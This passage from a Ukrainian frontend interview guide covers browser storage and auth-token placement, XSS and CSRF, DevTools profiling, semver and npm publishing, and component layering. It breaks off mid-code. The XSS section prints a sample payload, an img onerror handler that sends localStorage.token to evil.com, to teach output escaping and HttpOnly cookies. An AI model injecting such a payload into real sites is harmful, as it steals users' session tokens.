**🎯 Відповідь на іспиті:** localStorage, sessionStorage і cookies — три браузерні сховища з різним часом життя: localStorage живе, поки не видалиш, sessionStorage — до закриття вкладки, cookie — за `Expires`/`Max-Age`, і лише cookie автоматично їде на сервер з кожним запитом. Головна безпекова різниця: localStorage і sessionStorage читаються будь-яким JS на сторінці, тож перший же XSS викрадає звідти токен, а cookie з атрибутом `HttpOnly` JS не бачить узагалі. Звідси правило розкладання: несекретні налаштування, що мають пережити перезавантаження (тема, мова), — у localStorage; тимчасовий стан однієї вкладки — у sessionStorage; усе про автентифікацію — тільки в `HttpOnly` + `Secure` cookie, яку ставить і читає сервер. З обмежень: сховища дають ~5–10 MB, cookie — лише ~4 KB. Найпоширеніша помилка цього рівня — токени в localStorage «бо простіше з interceptor-ом»: секрет, який бачить JS, — це секрет, який бачить XSS.

Практична ситуація, де це питання стає гострим: студент залогінився — бекенд повернув токен сесії. Де його зберегти в браузері? Від відповіді залежить, чи зможе його вкрасти перший-ліпший впроваджений скрипт. Отже, це питання не про «три види сховищ», а про **рішення, що і куди класти**.

Три сховища з різним часом життя і різними правилами:

| | localStorage | sessionStorage | Cookies |
|---|---|---|---|
| Час життя | Поки не видалиш | До закриття вкладки | За `Expires`/`Max-Age` |
| Розмір | ~5–10 MB | ~5 MB | ~4 KB |
| Йде на сервер? | Ні | Ні | **Так**, автоматично з кожним запитом |
| Доступ з JS | Так | Так | Ні, якщо `HttpOnly` |

Два рядки таблиці визначають усю безпекову логіку. Перший: localStorage/sessionStorage **читаються будь-яким JS на сторінці** — включно з чужим. **XSS** (Cross-Site Scripting) — атака, коли зловмисний JavaScript потрапляє на твою сторінку й виконується (класично — неекранований користувацький ввід, вставлений у DOM); такий скрипт зробить `localStorage.getItem("token")` і відправить токен собі. Другий: cookie з атрибутом **`HttpOnly`** JS **не бачить узагалі** — її читає лише браузер (щоб автоматично додати до запиту) і сервер. XSS фізично не має до неї доступу.

Звідси драбина «що куди класти»:
- **localStorage** — несекретні клієнтські налаштування, що мають пережити перезавантаження: тема, мова, чернетка відповіді студента.
- **sessionStorage** — тимчасовий стан однієї вкладки, який не шкода втратити: крок візарда реєстрації, разові фільтри.
- **`HttpOnly` + `Secure` cookie** — усе, що стосується автентифікації (токен сесії): ставить і читає **сервер**, клієнтський JS не втручається (`Secure` = лише по HTTPS).

Шлях від уразливого стану до безпечного:
```ts
// ❌ ДО: токен у localStorage — перший же XSS його викрадає одним рядком
localStorage.setItem("token", jwt);              // видно будь-якому скрипту на сторінці

// КРОК: переносимо токен у cookie, яку ставить СЕРВЕР у відповіді на логін:
// Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict

// ✅ ПІСЛЯ: на клієнті токен-коду більше НЕМАЄ — браузер сам додає cookie
// до кожного запиту на цей домен. У localStorage лишилось тільки несекретне:
localStorage.setItem("theme", "dark");       // переживе перезавантаження
sessionStorage.setItem("wizardStep", "2");   // зникне із закриттям вкладки
```

**Антипатерн, який досі скрізь:** access/refresh-токени в localStorage «бо так простіше з interceptor-ом». Це найчастіша безпекова помилка рівня L3. Правило просте: секрет, який бачить JS, — секрет, який бачить XSS.

**Підсумок-якір:** localStorage/sessionStorage — клієнтські несекретні дані (різниця лише в часі життя); автентифікація — тільки `HttpOnly`+`Secure` cookie, бо її не бачить JS; cookie автоматично їде на сервер з кожним запитом — це і її сила (сесії), і її ризик (CSRF, див. нижче).

**➕ Пов'язане: що таке `SameSite` і як він захищає від CSRF? 🔵**
У «✅ ПІСЛЯ» вище cookie мала атрибут `SameSite=Strict` — ось навіщо. Те, що браузер додає cookie до кожного запиту *автоматично*, вміє обертатися проти тебе: запит на твій API, ініційований **чужим сайтом**, теж поїде з твоєю cookie (це основа атаки CSRF — див. наступне питання). `SameSite` керує саме цим: `Strict` — cookie йде лише із запитами зі свого сайту; `Lax` (дефолт у сучасних браузерах) — свій сайт + звичайні переходи за посиланням; `None` — завжди (вимагає `Secure`; потрібно хіба для легітимних крос-доменних сценаріїв, як-от віджет на чужому сайті). Для сесійної cookie став `Strict` або лишай `Lax` — обидва обрубують автоматичне надсилання з чужих сайтів.

**➕ Пов'язане: що таке XSS і CSRF та чим вони відрізняються? 🔵**
Обидві атаки вже з'являлися вище — зведімо їх поруч, бо захист від них різний.
**XSS (Cross-Site Scripting)** — зловмисник виконує *свій JavaScript на твоїй сторінці*. Приклад: у полі «ім'я» студент вводить `<img src=x onerror="fetch('https://evil.com?t='+localStorage.token)">`; якщо сторінка вставила це ім'я в DOM без екранування — скрипт виконався і токен поїхав зловмиснику. Захист: екранування виводу (React робить це за замовчуванням для тексту — але не для `dangerouslySetInnerHTML`), CSP, `HttpOnly` для секретів.
**CSRF (Cross-Site Request Forgery)** — зловмисний сайт змушує *браузер жертви* надіслати запит на твій API: жертва, залогінена в тебе, відкриває чужу сторінку, а там прихована форма робить `POST /api/enrollments` — і браузер слухняно додає сесійну cookie. Жодного чужого коду на твоїй сторінці — лише чужий запит з твоєю cookie. Захист: `SameSite`-cookie + CSRF-токени.
**Ключова різниця:** XSS виконує чужий код *у тебе*; CSRF шле запит *від твого імені без коду*. Тому й механізми захисту не взаємозамінні: `HttpOnly` рятує від XSS-крадіжки токена, але ніяк не заважає CSRF (браузер сам додає cookie); `SameSite` рятує від CSRF, але не від XSS.

**➕ Пов'язане: як SPA працює з access-токеном, якщо JS його «не бачить»? 🔵**
Логічне питання після «токен → лише HttpOnly cookie»: а як тоді interceptor з Q1 додає `Authorization`? Два робочі варіанти. **(1) Cookie-сесія повністю:** заголовок `Authorization` не потрібен — браузер сам додає cookie до кожного запиту (`fetch(..., { credentials: "include" })` для крос-доменних), сервер читає токен з cookie. Interceptor тоді взагалі не займається автентифікацією. **(2) Гібрид:** короткоживучий access-токен (хвилини) живе **в пам'яті JS** (звичайна змінна — зникає при перезавантаженні, і це ок), а довгоживучий refresh-токен — у `HttpOnly` cookie; при старті застосунку і при `401` interceptor викликає `/auth/refresh`, отримує свіжий access у пам'ять (механіка — у Q1). XSS у гіршому разі вкраде короткоживучий access з пам'яті, але не refresh — вікно атаки різко звужується.

## Q6. Як ефективно дебажити і профілювати фронтенд у браузері? 🟣

**🎯 Відповідь на іспиті:** Ефективний дебагінг у браузері — це breakpoints у вкладці Sources замість `console.log`: breakpoint показує весь стан і call stack у моменті без перезапуску, а умовний breakpoint рятує в циклах і частих обробниках. Профілювання — вкладка Performance, що записує все на main thread, і головний принцип: спершу виміряти, а не оптимізувати навмання. Мій флоу пошуку performance-bottleneck-а: вмикаю CPU throttling 4x (щоб відтворити слабкий телефон користувача), записую трейс під час проблемної дії, шукаю Long Tasks понад 50 мс, розкриваю flame chart до винної функції, підтверджую з боку React через React Profiler — і лише тоді роблю прицільний фікс (наприклад, debounce + віртуалізація), після чого обов'язково переміряю. Важливо розуміти механіку: JS, рендер і малювання ділять один main thread з бюджетом ~16 мс на кадр, тому довга задача — це видимий фриз. Типові помилки — оптимізувати без вимірювання і міряти продуктивність на dev-білді, який у рази повільніший за production.

Скарга з продакшену: «сторінка пошуку студентів лагає при вводі». Найгірша реакція — почати «оптимізовувати» навмання (обгорнути все в `memo`, повикидати код). Правильна — **виміряти**: знайти, де саме витрачається час, і лише тоді чинити. Для цього треба розуміти, що відбувається у браузері, — введемо три поняття, без яких трейс не прочитати.

- **Main thread (головний потік).** Увесь твій JavaScript, обробка подій, рендер React і відмальовування сторінки виконуються **в одному потоці** (потік — послідовність виконання: одна інструкція за раз). Поки в ньому крутиться твій код — браузер не може ні відреагувати на клік, ні намалювати кадр.
- **FPS і бюджет кадру.** Плавний рух = ~60 кадрів за секунду (FPS), тобто на один кадр є ~16 мс. Задача, що займає main thread на 200 мс, «з'їдає» 12 кадрів — око бачить фриз. Задачі довші за 50 мс DevTools позначає як **Long Task**.
- **Layout thrashing.** Layout (reflow) — перерахунок браузером геометрії елементів (хто де стоїть і якого розміру). Читання геометрії (`offsetHeight`, `getBoundingClientRect`) змушує браузер порахувати layout *негайно*, якщо перед цим були зміни стилів. Чергування «змінив стиль → прочитав розмір» у циклі змушує перераховувати layout на кожній ітерації:
```ts
// ❌ thrashing: на кожній ітерації — запис стилю, потім читання → примусовий reflow ×1000
rows.forEach((r) => { r.style.height = "40px"; total += r.offsetHeight; });
// ✅ розділити фази: спершу ВСІ читання, потім ВСІ записи → один reflow
const heights = rows.map((r) => r.offsetHeight);   // фаза читань
rows.forEach((r) => { r.style.height = "40px"; }); // фаза записів
```

**Інструментарій** (Chrome DevTools + React DevTools):
- **Sources → breakpoints** — зупинити виконання в рядку і дивитися живі значення змінних та call stack (ланцюжок «хто кого викликав»). Це сильніше за `console.log`: лог показує одне значення, яке ти здогадався вивести, breakpoint — увесь стан у моменті, без перезапуску. **Умовний breakpoint** (правий клік → *Add conditional breakpoint* → `user.id === 42`) не спиняється на кожній ітерації — рятує в циклах і частих обробниках.
- **Performance** — записує все, що відбувалося на main thread: задачі JS, layout, малювання.
- **Network** — waterfall запитів: що повільне, що велике, що блокує.
- **React Profiler** (React DevTools) — які компоненти рендерились і чому (детально — Q7).

**Наскрізний сценарій: «лагає при вводі в пошук студентів» — крок за кроком:**
1. **Відтвори як користувач:** DevTools → Performance → ⚙ → *CPU: 4x slowdown* (твій ноутбук швидший за телефон студента — без цього лаг можеш просто не побачити).
2. **Запиши:** Record → надрукуй кілька символів у поле → Stop.
3. **Знайди винну задачу:** на доріжці **Main** шукай довгі суцільні блоки з червоними позначками (Long Task > 50 мс) — вони збігаються з натисканнями клавіш.
4. **Розкрий задачу — flame chart** (діаграма «хто кого викликав і скільки це тривало»: ширина блоку = час). Бачиш: обробник `onChange` → фільтрація масиву з 5000 студентів → ререндер усього списку. На **кожен символ**.
5. **Підтвердь з боку React:** React Profiler → той самий ввід → список з 5000 рядків ререндериться щонатискання, причина — `props changed` (новий відфільтрований масив).
6. **Тепер — і лише тепер — фікс:** debounce вводу (фільтрувати після паузи в друці, а не на кожен символ) + віртуалізація списку (рендерити лише видимі рядки — Q14). Не «обгорнути все в memo», а прицільний удар по виміряній причині.
7. **Верифікація:** повторний запис Performance — Long Tasks зникли, ввід плавний. Оптимізація без повторного виміру — не оптимізація, а сподівання.

**Типові помилки:** (1) оптимізувати без вимірювання — витратиш день на мемоізацію компонента, який і так рендериться за 2 мс; (2) міряти продуктивність на dev-білді — він у рази повільніший (перевірки React, відсутність мінімізації); висновки про перф роби на production-білді (`npm run build && npm run preview`); (3) забути про CPU throttling і не відтворити проблему взагалі.

**Підсумок-якір:** дебаг — breakpoints замість console.log; продуктивність — записати Performance-трейс із CPU throttling, знайти Long Task, розкрити flame chart до винної функції, підтвердити React Profiler-ом, полагодити прицільно і **переміряти**.

**➕ Пов'язане: що таке memory leak у SPA і як його знайти? 🔵**
Performance-трейс показує, куди йде час, — а є ще другий ресурс: пам'ять. **Витік пам'яті** — об'єкти, які вже не потрібні, але не можуть бути прибрані збирачем сміття (garbage collector звільняє лише те, на що не лишилось посилань). У SPA сторінка не перезавантажується годинами, тож витоки накопичуються: класика — не прибраний `setInterval`, не відписаний event listener, підписка в `useEffect` без cleanup. Пошук: DevTools → **Memory** → heap snapshot (знімок усіх об'єктів у пам'яті) до взаємодії → повторити взаємодію (відкрити/закрити модалку 10 разів) → snapshot після → порівняти: якщо «закритих» модалок у пам'яті 10 — вони течуть. Профілактика — cleanup-функція в кожному `useEffect`, що щось підписує:
```ts
useEffect(() => {
  const id = setInterval(poll, 5000);
  return () => clearInterval(id); // ← без цього рядка кожне монтування додає вічний таймер
}, []);
```

**➕ Пов'язане: що показує вкладка Coverage в DevTools? 🟢**
Coverage відповідає на питання «скільки із завантаженого JS/CSS сторінка реально виконала»: червона частка смуги — код, який приїхав, але не запускався. Якщо на стартовій сторінці 60% JS мертвого — це прямий аргумент за code-splitting (Q3, Q14): винести той код у chunks, що вантажаться на вимогу. Нюанс: «не виконався зараз» ≠ «не потрібен ніколи» (обробник помилки теж мертвий, поки помилки нема) — Coverage дає кандидатів, а не вирок.

**➕ Пов'язане: як відтворити «у користувача лагає, а в мене все швидко»? 🔵**
У сценарії вище ми вмикали CPU throttling — це половина відповіді, ось повний чеклист розриву «мій MacBook ≠ телефон студента»: (1) **CPU: 4–6x slowdown** у Performance — емуляція слабкого процесора; (2) **Network: Slow 4G** у Network — повільна мережа; (3) **production-білд** (`npm run build && npm run preview`) — dev-білд повільніший у рази і бреше про перф; (4) обсяг даних як у проді — у тебе 20 тестових студентів, у користувача 5000 (саме тому лаг фільтрації з кроку 4 у dev-базі невидимий). Якщо після всіх чотирьох пунктів лаг не відтворився — лишаються польові інструменти: Sentry/RUM-метрики з реальних сесій.

## Q7. Навіщо специфічні devtools під фреймворк (React / Angular DevTools)? 🟣

**🎯 Відповідь на іспиті:** Фреймворкові devtools (React DevTools, Angular DevTools) потрібні, бо браузер бачить лише готовий DOM, а компонентів, їхніх props, state і хуків у ньому вже не існує — розширення показує застосунок мовою фреймворку. У React DevTools вкладка Components дає живе дерево компонентів з поточними props/state/hooks, які можна редагувати наживо, і ланцюжок «rendered by», щоб зрозуміти, звідки прийшов проп. Вкладка Profiler записує рендери: скільки мілісекунд рендерився кожен компонент і — головне — «Why did this render?» з причиною кожного ререндеру (`props changed`, `hook changed`, `parent rendered`). Практичний сценарій: список лагає при вводі — Profiler показує, що 5000 рядків ререндеряться на кожен символ через новий колбек у пропсах, стабілізую його `useCallback` і повторним записом перевіряю, що ререндери зникли. Angular DevTools — той самий принцип для Angular: дерево компонентів, `@Input`/`@Output`, профайлер change detection. Нюанс-межа: дебажити треба на dev-білді (у production імена компонентів мінімізовані), а от продуктивність міряти — навпаки, на production-білді.

Спробуй звичайним інспектором відповісти на питання «чому цей компонент показує старе значення?» — і впрешся в стіну: у вкладці Elements видно лише **готовий HTML** (`<div class="css-x7f2">...`), а компонентів, їхніх `props`, `state` і хуків там не існує. React перетворює компоненти на DOM ще до того, як браузер їх побачить, — тож усе цікаве (стан, пропси, хто кого відрендерив) губиться при перетворенні. **React DevTools** — розширення браузера, що показує застосунок мовою фреймворку: деревом компонентів, а не div-ів.

**Вкладка Components** — живе дерево компонентів:
- для вибраного компонента — поточні значення `props`, `state` і всіх **hooks** (`useState`, `useContext`, `useReducer`);
- значення можна **редагувати наживо**: підправив state прямо в панелі → UI миттєво відреагував. Це найшвидший спосіб перевірити гіпотезу «якщо тут буде `true`, усе запрацює?» — без правок коду і перезавантаження;
- **«rendered by»** — ланцюг батьків: звідки компонент прийшов і хто передав пропси (рятує, коли «не розумію, звідки цей проп»);
- пошук за іменем, бейджі `Memo`/`ForwardRef`, і який саме `Context` постачає значення компоненту.

**Вкладка Profiler** — для продуктивності. Спершу термін: **commit** — момент, коли React застосовує пораховані зміни до DOM; один запис профайлера — це серія commit-ів під час взаємодії:
- записуєш взаємодію → бачиш flame graph кожного commit: **скільки мс** рендерився кожен компонент;
- **«Why did this render?»** (вмикається в налаштуваннях профайлера) — показує *причину* кожного ререндеру: `props changed` (і які саме!), `hook changed`, `parent rendered`. Це головний інструмент проти зайвих ререндерів — без нього причину доводиться вгадувати;
- **«Highlight updates»** — підсвічує рамкою компоненти в момент їх ререндеру прямо на сторінці.

Типовий шлях від симптому до фікса — продовження сценарію з Q6 («лагає ввід у пошук»):
1. Components: стан `query` оновлюється коректно → проблема не в логіці, а в продуктивності.
2. Profiler → запис вводу → бачимо: `StudentRow` × 5000 ререндериться на кожен символ.
3. «Why did this render?» → `props changed: (onSelect)` — батько на кожен рендер створює **нову** функцію `onSelect`, тому `React.memo` на рядку не спрацьовує.
4. Фікс прицільний: стабілізувати `onSelect` через `useCallback` (чому нова функція «ламає» memo — див. Q10 про стабільність посилань).
5. Повторний запис: рядки більше не ререндеряться — перевірили, а не повірили.

**Коли яка вкладка** — коротка мапа: «state не такий, як очікую» → Components (живі значення без console.log); «повільно/смикається» → Profiler + Why did this render; «чи працює мій memo?» → Highlight updates (компонент не має мигтіти, якщо його пропси не змінились).

**Angular DevTools** — той самий принцип для Angular: дерево компонентів, `@Input`/`@Output`, профайлер change detection (механізму, яким Angular з'ясовує, що перемалювати).

**Нюанси-межі:** у production-білді імена компонентів мінімізовані — дерево нечитабельне, тож дебаж на dev-білді (а от *продуктивність* міряй на production-білді — Q6; це різні задачі). І пам'ятай поділ праці: DevTools показує, *що* сталося; питання «*чому* компонент ререндериться» закриває саме «Why did this render?», а не розглядання DOM.

```tsx
function Counter() {
  const [count, setCount] = useState(0); // ← у Components видно count наживо; клік по UI
  return <button onClick={() => setCount((c) => c + 1)}>{count}</button>; //   міняє його на очах
}
```

**Підсумок-якір:** браузер бачить DOM, а не компоненти — фреймворкові devtools повертають дебагу мову фреймворку: Components = живі props/state/hooks з редагуванням, Profiler = хто рендерився, скільки і чому («Why did this render?»).

**➕ Пов'язане: що робить «Highlight updates» і навіщо? 🟢**
Це та сама опція з кроку «чи працює мій memo?» вище. Вона підсвічує рамкою кожен компонент у момент його ререндеру прямо на сторінці. Використання: увімкни → виконай дію (введи символ у пошук) → усе, що блимнуло, — ререндерилось. Якщо блимає весь екран на кожне натискання клавіші — ререндериться зайве; якщо після додавання `React.memo` компонент далі мигтить при незмінних пропсах — мемоізація не працює (найчастіше через нестабільне посилання в пропсах, див. Q10). Це «швидкий погляд» без запису профайлера.

**➕ Пов'язане: що дає time-travel у Redux DevTools? 🟢**
Той самий принцип «інструмент мовою твоєї архітектури», але для Redux. Redux DevTools логує кожну dispatch-нуту дію разом зі станом до/після — і дозволяє «перемотувати» застосунок назад-вперед по діях. Сценарій: тестувальник каже «кошик зламався після серії кліків» → відмотуєш історію дій і бачиш, після якої саме дії стан став неправильним, і який reducer його зіпсував. Це можливо завдяки чистоті reducer-ів (той самий стан + та сама дія = той самий результат — див. Q16): історію можна програвати повторно.

**➕ Пов'язане: чим React Profiler відрізняється від вкладки Performance (Q6)? 🔵**
Обидва «профілюють», але різні шари. **Performance** (DevTools браузера) бачить увесь main thread: твій JS, layout, малювання, garbage collection — але React для нього просто «якась довга функція». **React Profiler** бачить лише рендери компонентів — зате мовою компонентів і з причинами. Робочий порядок: Performance відповідає «час взагалі йде на JS/React, а не на layout чи мережу?» → якщо на React, Profiler відповідає «який компонент і чому». Почнеш одразу з React Profiler — ризикуєш пропустити, що справжня проблема, наприклад, layout thrashing, якого він не бачить.

## Q8. Що таке semver і як опублікувати (у т.ч. приватний) npm-пакет? 🔵

**🎯 Відповідь на іспиті:** Semver (semantic versioning) — це угода, що номер версії `MAJOR.MINOR.PATCH` є повідомленням для споживача пакета про ризик оновлення: MAJOR — є breaking change, MINOR — додали нове без ламання, PATCH — лише виправлення багів. Діапазони `^` і `~` у `package.json` автоматично довіряють цій обіцянці, тому breaking change під виглядом patch ламає всіх, хто оновлюється через `^`. Публікація npm-пакета: у `package.json` задати name, version, `files` і точку входу, зібрати `dist`, далі `npm login`, підняти версію через `npm version` за semver-сенсом зміни і `npm publish`. Приватний пакет — той самий флоу через приватний реєстр (GitHub Packages, Verdaccio): у файлі `.npmrc` вказується «пакети цього scope бери з цього реєстру з цим токеном», а сам `NPM_TOKEN` живе у змінній середовища локально і в CI — ніколи в git. Головні помилки — ламка зміна під patch/minor і закомічений токен реєстру.

Ситуація, заради якої існує semver: твоя команда має спільну бібліотеку компонентів `@edu/ui`, яку використовують три фронтенд-репозиторії. Ти «підчистив API» — перейменував проп у `<CourseCard>` — і опублікував як звичайне виправлення. Наступного ранку два інші проєкти оновили залежності, і їхні білди впали. Проблема не в зміні — зміни неминучі, — а в тому, що **версія нічого не сказала споживачам про ризик оновлення**.

**Semver (semantic versioning)** — угода, що номер версії `MAJOR.MINOR.PATCH` — це **повідомлення для споживача пакета**, а не лічильник релізів. Кожна частина відповідає на його головне питання — «чи безпечно мені оновитись?»:
- **MAJOR** (`1.4.2 → 2.0.0`) — є **breaking change**: код, що працював зі старою версією, може зламатись. Оновлення вимагає читати changelog і правити код.
- **MINOR** (`1.4.2 → 1.5.0`) — додано нове, старе працює як працювало. Оновлюватись безпечно.
- **PATCH** (`1.4.2 → 1.4.3`) — лише виправлення багів. Оновлюватись безпечно і бажано.

**Breaking change** — будь-яка зміна, що ламає *чинний код споживача*. На прикладі `@edu/ui`:
```tsx
// v1: <CourseCard onSelect={fn} />
// v2: проп перейменовано
<CourseCard onChange={fn} />   // ← MAJOR: у всіх, хто писав onSelect, компонент мовчки зламався
// а от ДОДАТИ опційний проп size — MINOR: старий код без size працює далі
// виправити з'їхавший стиль бейджа — PATCH
```
Ламкими бувають і неочевидні речі: підняти мінімальну версію React у peerDependencies, змінити дефолт пропа, посилити тип (був `string`, став `"sm" | "md"`). Критерій один: чи може *чийсь чинний код* перестати працювати.

Semver працює у зв'язці з **діапазонами** в `package.json` споживача — саме тут його обіцянки перетворюються на поведінку `npm install`:
```json
{ "react": "^18.2.0",   // ^ = «беру MINOR і PATCH»: 18.x.x, але не 19 — довіряю semver-обіцянці
  "lodash": "~4.17.0" } // ~ = «беру лише PATCH»: 4.17.x — обережніший режим
```
Тепер видно, чому історія з прологу закінчилась падінням: breaking change поїхав у PATCH-версії, і `^` у споживачів затягнув його автоматично. Semver — це довіра: збрехав номером — зламав усіх, хто довіряє `^`.

**Повний флоу публікації:**
```bash
# 1. package.json: name (@myorg/ui), version, "files": ["dist"] — що піде в пакет,
#    "main"/"exports" — точка входу для споживачів
npm run build            # 2. зібрати dist/ — публікується ЗІБРАНИЙ код, а не src
npm login                # 3. авторизація в реєстрі (одноразово)
npm version minor        # 4. підняти версію ЗА SEMVER-СЕНСОМ зміни (зробить git-commit + tag)
npm publish --access public  # 5. надіслати в реєстр (--access public — для scoped-пакетів)
git push --follow-tags   # 6. тег версії — в репозиторій, щоб реліз було видно в git
```

**Навіщо приватний реєстр.** Публічний npm бачить весь світ — а `@edu/ui` містить внутрішній код компанії. Приватний реєстр (GitHub Packages, Verdaccio, npm Pro) дає командам головну вигоду npm-екосистеми — версіоновані спільні пакети між репозиторіями — без публікації коду назовні. Конфігурується файлом `.npmrc` у корені проєкту: «пакети цього scope бери звідси, з цим токеном»:
```
@myorg:registry=https://npm.pkg.github.com
//npm.pkg.github.com/:_authToken=${NPM_TOKEN}
```
`NPM_TOKEN` живе у змінній середовища (локально та в CI), **ніколи** в git — інакше будь-хто з доступом до репозиторію читає і публікує ваші пакети.

**Типові помилки:** ламка зміна під patch/minor (головний гріх — див. пролог); публікація без білду чи без `"files"` (у пакет їде сміття або не їде dist); токен реєстру закомічений у `.npmrc` в git.

**Підсумок-якір:** semver — контракт зі споживачем: MAJOR = ламає, MINOR = додає, PATCH = лагодить; діапазони `^`/`~` автоматично довіряють цьому контракту, тож чесність номера — не педантизм, а безпека всіх залежних проєктів; приватний реєстр = той самий npm-флоу для внутрішнього коду команди.

**➕ Пов'язане: що таке `peerDependencies` і навіщо? 🔵**
Вище згадувалося, що підняти версію React у peerDependencies — breaking change; розберімо сам механізм. `peerDependencies` — спосіб пакета сказати: «я працюю *поруч* із пакетом X у твоєму проєкті, але сам його не встановлюю». Наша `@edu/ui` оголошує `"peerDependencies": { "react": ">=18" }`: якщо б вона тягла React у звичайних `dependencies`, у застосунку могли б опинитись **дві копії React** (одна твоя, одна її) — а це ламає хуки, які вимагають єдиного екземпляра React на застосунок. Peer = «використовую твій, не приношу свій».

**➕ Пов'язане: чим `dependencies` відрізняються від `devDependencies`? 🟢**
`dependencies` — те, без чого пакет не працює в рантаймі у споживача (React, date-fns): npm встановить їх кожному, хто поставив твій пакет. `devDependencies` — потрібне лише для розробки самого пакета (TypeScript, vitest, bundler): споживачам не встановлюється. Практичний наслідок для авторів пакетів: покладеш runtime-залежність у devDependencies — у тебе локально все працює (dev-залежності ж стоять), а в споживача пакет падає з «module not found» — класичний баг публікації.

**➕ Пов'язане: навіщо lock-файл (package-lock.json / yarn.lock)? 🔵**
Діапазони `^`/`~` з основної відповіді створюють люфт: `^1.2.0` сьогодні ставить 1.2.0, за місяць — 1.9.3. **Lock-файл** фіксує *точні* версії всього дерева залежностей (включно з транзитивними — залежностями твоїх залежностей), обчислені при останньому встановленні. Результат: `npm ci` у колеги і в CI ставить байт-у-байт ті самі версії, що в тебе. Без lock-файла отримуєш класику «в мене працює, у CI впало» — бо CI мовчки затягнув свіжіший minor якоїсь транзитивної залежності. Тому lock-файл **комітять у git** завжди.

**➕ Пов'язане: що робити, якщо опублікував зламану версію? 🔵**
Продовження прологу: версія з багом уже в реєстрі, споживачі її тягнуть. Перевчений рефлекс «видалити» тут не працює: `npm unpublish` дозволений лише в перші 72 години і ламає всіх, хто вже залежить від версії (сумнозвісний інцидент `left-pad`: автор видалив пакет-однорядник — і поклав білди половини екосистеми). Правильний флоу: (1) опублікувати виправлення наступною версією (`npm version patch && npm publish`); (2) позначити биту версію попередженням — `npm deprecate @edu/ui@2.1.0 "битий реліз, беріть 2.1.1"`: вона лишається встановлюваною (нічиї білди не падають), але кожен, хто її ставить, бачить попередження.

## Q9. Як проєктувати структуру компонентів (page / feature / library)? 🟣

**🎯 Відповідь на іспиті:** Структуру компонентів проєктую за одним питанням — наскільки компонент знає про домен: page-компоненти знають роут і звідки брати дані (`CoursePage`), feature-компоненти — доменну логіку однієї фічі (`CourseList`, `EnrollForm`), а рівень components library / UI (`Button`, `Modal`) про домен не знає нічого — це чиста механіка. Правило залежностей — тільки згори вниз: page → feature → ui і ніколи навпаки, бо напрямок залежностей і є межею перевикористовності: щойно `Button` імпортував доменний тип, він прикутий до цього домену назавжди. У коді це feature-based структура: тека фічі тримає свої pages, components, hooks і api, а `shared/ui` — доменно-чисті примітиви для всіх фіч. Дані течуть униз пропсами, а знання про домен униз не протікають — тому UI-примітив переноситься в будь-яку фічу і навіть інший проєкт. Типові помилки: «розумна кнопка», що сама лізе у стор чи API; `shared/` як смітник «може, комусь знадобиться»; і page з бізнес-логікою замість делегування у feature.

Симптом поганої структури впізнається миттєво: треба зробити «таку саму кнопку, як на сторінці курсу» — а вона намертво вшита в `CoursePage` разом із запитом даних і доменною логікою; переносиш — тягнеться пів сторінки. Компоненти не діляться на рівні, тому **ніщо не перевикористовується і все залежить від усього**.

Рішення — класифікувати компоненти за **одним питанням: наскільки компонент знає про домен** (домен — предметна область застосунку: курси, студенти, записи; протилежність — універсальні речі типу «кнопка»):

| Рівень | Що знає | Приклад |
|---|---|---|
| **Page** | Роут, звідки брати дані, з чого зібрати сторінку | `CoursePage` на `/courses/:id` |
| **Feature** | Доменну логіку однієї фічі | `CourseList`, `EnrollForm` |
| **Library / UI** | **Нічого про домен** — чиста механіка | `Button`, `Modal`, `Input` |

**Правило залежностей — тільки згори вниз:** page → feature → ui, і ніколи навпаки. Чому це правило, а не смак: `Button`, який нічого не знає про курси, можна взяти в будь-яку фічу і навіть інший проєкт; щойно він імпортував щось доменне (стор курсів, тип `Course`) — він прикутий до цього домену назавжди. Напрямок залежностей = межа перевикористовності.

**Feature-based структура** (код групується за фічами, а не за типами файлів):
```
src/
  features/
    courses/
      pages/CoursePage.tsx        # page:    роут + дані
      components/CourseList.tsx   # feature: доменна логіка «курсів»
      hooks/useCourses.ts
      api/coursesApi.ts
  shared/
    ui/Button.tsx                 # library: без домену, для всіх фіч
    ui/Modal.tsx
```
Альтернатива, від якої це рятує, — групування за типами (`components/`, `hooks/`, `api/` на весь проєкт): там код однієї фічі розмазаний по чотирьох теках, і видалити фічу чи знайти «все про курси» — квест.

**Один потік даних крізь усі три рівні** (той самий приклад `courses` згори вниз):
```tsx
// PAGE — знає про роут і дані, сам нічого не малює
function CoursePage() {
  const { data } = useCourses();            // тягне дані (React Query під капотом)
  return <CourseList courses={data} />;     // віддає у feature через пропси
}

// FEATURE — знає домен «курс», але не тягне дані і не володіє стилями
function CourseList({ courses }: { courses: Course[] }) {
  return (
    <ul>
      {courses.map((c) => (
        <li key={c.id}>
          {c.title} <Button>Записатися</Button>  {/* бере готовий UI-примітив */}
        </li>
      ))}
    </ul>
  );
}

// LIBRARY/UI — про курси не чув, працює в будь-якому проєкті
function Button({ children, ...props }: React.ComponentProps<"button">) {
  return <button className="btn" {...props}>{children}</button>;
}
```
Простеж напрямки: **дані** течуть униз (`CoursePage → CourseList → Button`), а **знання про домен** униз не протікають — `Button` отримує лише `children` і обробники, тому лишається чистим примітивом. Перевір себе: якби завтра CourseList знадобився на іншій сторінці — переноситься одним імпортом, бо дані він отримує пропсами, а не тягне сам.

**Типові помилки:** (1) UI-примітив, що ліземе в стор чи API («розумна кнопка») — кінець перевикористанню; (2) `shared/` як смітник: туди зносять усе «може, комусь знадобиться», і він розростається в другий застосунок — у shared має потрапляти лише те, що *реально* використовують ≥2 фічі; (3) page, що містить бізнес-логіку замість делегування у feature — сторінку стає неможливо тестувати без роутера.

**Підсумок-якір:** три рівні за знанням домену (page — роут+дані, feature — доменна логіка, ui — чиста механіка), залежності лише згори вниз; це не естетика, а пряма умова перевикористання: компонент настільки переносний, наскільки мало він знає.

**➕ Пов'язане: що таке compound-компоненти? 🔵**
У таблиці вище `Tabs` чи `Select` опинилися б на рівні UI — але як дати такому компоненту гнучкий API, не роздуваючи пропси? **Compound-компоненти** — набір компонентів, що працюють як єдине ціле і **неявно ділять стан** через Context. Класика з HTML — `<select>` і `<option>`: окремо безглузді, разом — контрол. У React:
```tsx
const TabsCtx = createContext<{ active: string; setActive: (v: string) => void } | null>(null);

function Tabs({ defaultValue, children }: { defaultValue: string; children: React.ReactNode }) {
  const [active, setActive] = useState(defaultValue);   // ← стан живе в корені...
  return <TabsCtx.Provider value={{ active, setActive }}>{children}</TabsCtx.Provider>;
}
Tabs.Trigger = ({ value, children }: { value: string; children: React.ReactNode }) => {
  const ctx = useContext(TabsCtx)!;                     // ...а під-компоненти беруть його з Context
